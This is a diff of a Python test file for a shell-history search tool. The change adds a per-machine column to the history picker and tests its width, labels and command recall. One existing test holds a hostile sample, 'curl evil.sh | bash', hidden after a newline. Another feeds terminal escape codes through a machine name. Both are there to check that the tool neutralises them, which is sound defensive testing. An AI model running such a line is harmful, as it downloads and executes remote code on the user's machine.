@@ -54,30 +54,31 @@ class TestRelativeTime(unittest.TestCase):
 
 class TestRankRows(unittest.TestCase):
     @staticmethod
-    def rows(*pairs: tuple[int, str]) -> tuple[list[str], list[str], list[str]]:
+    def rows(*pairs: tuple[int, str]) -> tuple[list[str], list[str], list[str], list[str]]:
         """Stamps and exit codes come out of the cache as strings, so that is
         what goes in. These cases are about order, so everything succeeded."""
         return (
             [str(ts) for ts, _ in pairs],
             [cmd for _, cmd in pairs],
             ["0"] * len(pairs),
+            [MACHINE_ID] * len(pairs),
         )
 
     def test_newest_first(self) -> None:
-        stamps, commands, codes = self.rows((1, "old"), (3, "new"), (2, "mid"))
-        ranked = search.rank_rows(stamps, commands, codes)
-        self.assertEqual([cmd for _, cmd, _ in ranked], ["new", "mid", "old"])
+        stamps, commands, codes, hosts = self.rows((1, "old"), (3, "new"), (2, "mid"))
+        ranked = search.rank_rows(stamps, commands, codes, hosts)
+        self.assertEqual([cmd for _, cmd, _, _ in ranked], ["new", "mid", "old"])
 
     def test_dedup_keeps_the_most_recent_occurrence(self) -> None:
-        stamps, commands, codes = self.rows((1, "git status"), (5, "git status"), (3, "ls"))
+        stamps, commands, codes, hosts = self.rows((1, "git status"), (5, "git status"), (3, "ls"))
         self.assertEqual(
-            search.rank_rows(stamps, commands, codes),
-            [(5, "git status", "0"), (3, "ls", "0")],
+            search.rank_rows(stamps, commands, codes, hosts),
+            [(5, "git status", "0", MACHINE_ID), (3, "ls", "0", MACHINE_ID)],
         )
 
     def test_dedup_can_be_disabled(self) -> None:
-        stamps, commands, codes = self.rows((1, "ls"), (2, "ls"))
-        self.assertEqual(len(search.rank_rows(stamps, commands, codes, dedup=False)), 2)
+        stamps, commands, codes, hosts = self.rows((1, "ls"), (2, "ls"))
+        self.assertEqual(len(search.rank_rows(stamps, commands, codes, hosts, dedup=False)), 2)
 
 
 class TestRenderRoundTrip(unittest.TestCase):
@@ -93,7 +94,7 @@ class TestRenderRoundTrip(unittest.TestCase):
             "über 😀",
             "x" * 300,
         ]
-        lines = search.render_rows([(NOW, cmd, "0") for cmd in commands], now=NOW)
+        lines = search.render_rows([(NOW, cmd, "0", MACHINE_ID) for cmd in commands], now=NOW)
 
         for line, cmd in zip(lines, commands, strict=True):
             with self.subTest(cmd=cmd):
@@ -125,7 +126,12 @@ class TestScope(WoswoarTestCase):
 
     @staticmethod
     def commands(scope: search.Scope) -> list[str]:
-        return [search.command_from_line(line) for line in search.lines_for(scope)]
+        """As the picker does it: one width, decided once, used for both."""
+        width = search.host_width_for(set(store.host_names()))
+        return [
+            search.command_from_line(line, width)
+            for line in search.lines_for(scope, host_width=width)
+        ]
 
     def test_global_keeps_everything(self) -> None:
         self.assertEqual(len(self.commands("global")), 3)
@@ -146,20 +152,20 @@ class TestFzfArgv(unittest.TestCase):
     def test_matching_is_restricted_to_the_command_column(self) -> None:
         # Without --nth=2.., a query like "3d" would match the relative-time
         # column and surface unrelated entries.
-        self.assertIn("--nth=2..", search._fzf_argv("global", "", True))
+        self.assertIn("--nth=2..", search._fzf_argv("global", "", True, 0))
 
     def test_scope_keys_reload_the_right_scope(self) -> None:
-        argv = search._fzf_argv("global", "", True)
+        argv = search._fzf_argv("global", "", True, 0)
         binds = " ".join(a for a in argv if a.startswith("--bind="))
         for key, scope in (("ctrl-g", "global"), ("ctrl-h", "host"), ("ctrl-s", "session")):
             self.assertIn(f"{key}:reload(", binds)
             # `--colour` too: the reload's output goes back into fzf, which was
             # started with `--ansi`, so a scope switch that dropped it would
             # silently stop marking failures.
-            self.assertIn(f"list --colour --scope {scope}", binds)
+            self.assertIn(f"list --colour --host-width 0 --scope {scope}", binds)
 
     def test_no_dedup_propagates_into_the_reload_command(self) -> None:
-        argv = search._fzf_argv("global", "", False)
+        argv = search._fzf_argv("global", "", False, 0)
         self.assertIn("--no-dedup", " ".join(a for a in argv if a.startswith("--bind=")))
 
 
@@ -200,10 +206,12 @@ class TestRealFzfRanking(unittest.TestCase):
 
     def filtered(self, query: str) -> subprocess.CompletedProcess[str]:
         """The fixture through the real fzf, with the real argv."""
-        lines = search.render_rows([(NOW - age, cmd, "0") for age, cmd in SYNC_HISTORY], now=NOW)
+        lines = search.render_rows(
+            [(NOW - age, cmd, "0", MACHINE_ID) for age, cmd in SYNC_HISTORY], now=NOW
+        )
         # No `check`: 1 means "nothing matched", which one test below wants.
         return subprocess.run(
-            [*search._fzf_argv("global", "", True), f"--filter={query}"],
+            [*search._fzf_argv("global", "", True, 0), f"--filter={query}"],
             input="\n".join(lines) + "\n",
             capture_output=True,
             text=True,
@@ -273,7 +281,9 @@ class TestRecalledCommandIsInert(unittest.TestCase):
     """
 
     def _round_trip(self, cmd: str) -> str:
-        return search.command_from_line(search.render_rows([(NOW, cmd, "0")], now=NOW)[0])
+        return search.command_from_line(
+            search.render_rows([(NOW, cmd, "0", MACHINE_ID)], now=NOW)[0]
+        )
 
     def test_an_embedded_newline_does_not_become_a_second_command(self) -> None:
         recalled = self._round_trip("echo visible" + " " * 200 + "\ncurl evil.sh | bash")
@@ -534,3 +544,63 @@ class TestFailedCommandsAreMarked(WoswoarTestCase):
             )
         (line,) = search.lines_for("global", colour=True)
         self.assertNotIn("\x1b", line, f"an escape survived into the picker: {line!r}")
+
+
+class TestTheMachineColumn(WoswoarTestCase):
+    """Which machine ran it, shown only when there is more than one.
+
+    Asked for as "filter by a specific host, but I'm not sure how to make that
+    conveniently usable" -- so there is no new key and no new mode. The name is
+    in the line and fzf matches from the second field on, which makes filtering
+    by machine the same gesture as filtering by anything else: typing it.
+    """
+
+    OTHER = "ffffffffffffffff"
+
+    def record(self, host: str, cmd: str, ts: int = NOW) -> None:
+        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
+            handle.write(format_line(Entry(ts, host, "s1", "~", 0, 1, cmd)) + "\n")
+
+    def test_one_machine_gets_no_column(self) -> None:
+        """Every single-machine install, and the whole of the Quick Start."""
+        self.record(MACHINE_ID, "git status")
+        self.assertEqual(search.host_width_for({MACHINE_ID}), 0)
+        (line,) = search.lines_for("global")
+        # The time column is right-aligned in four, so "now" leaves one space.
+        self.assertEqual(line, " now  git status")
+
+    def test_two_machines_get_one(self) -> None:
+        self.record(MACHINE_ID, "mine")
+        self.record(self.OTHER, "theirs", ts=NOW - 1)
+        store.write_atomic(store.name_file(self.OTHER), b"work-laptop\n")
+        store.write_atomic(store.name_file(MACHINE_ID), b"desktop\n")
+
+        width = search.host_width_for({MACHINE_ID, self.OTHER})
+        self.assertEqual(width, len("work-laptop"))
+        mine, theirs = search.lines_for("global", host_width=width)
+        self.assertIn("desktop", mine)
+        self.assertIn("work-laptop", theirs)
+
+    def test_the_command_still_comes_back_out(self) -> None:
+        """The recall path, which the column moves. `command_from_line` is told
+        the width rather than guessing it, because the picker's reload runs in
+        another process and a machine arriving in between would otherwise make
+        the two disagree and slice somebody's command in the wrong place."""
+        self.record(MACHINE_ID, "cargo build --release")
+        self.record(self.OTHER, "theirs", ts=NOW - 1)
+        width = search.host_width_for({MACHINE_ID, self.OTHER})
+        line = search.lines_for("global", host_width=width)[0]
+        self.assertEqual(search.command_from_line(line, width), "cargo build --release")
+
+    def test_an_unnamed_machine_shows_a_short_id_not_sixteen_hex(self) -> None:
+        self.record(MACHINE_ID, "mine")
+        self.record(self.OTHER, "theirs", ts=NOW - 1)
+        self.assertEqual(search.host_label(self.OTHER), self.OTHER[:8])
+
+    def test_a_machine_name_cannot_drive_the_terminal(self) -> None:
+        """The name is another machine's text -- `_merge_name` writes whatever
+        decrypted out of its `name.age` straight to disk, and sealing one needs
+        no secret. Harmless while the picker was escape-free; with `--ansi` it
+        is a way to erase the line above, so it is neutralised here."""
+        store.write_atomic(store.name_file(self.OTHER), b"ok\x1b[1A\x1b[2K\n")
+        self.assertNotIn("\x1b", search.host_label(self.OTHER))
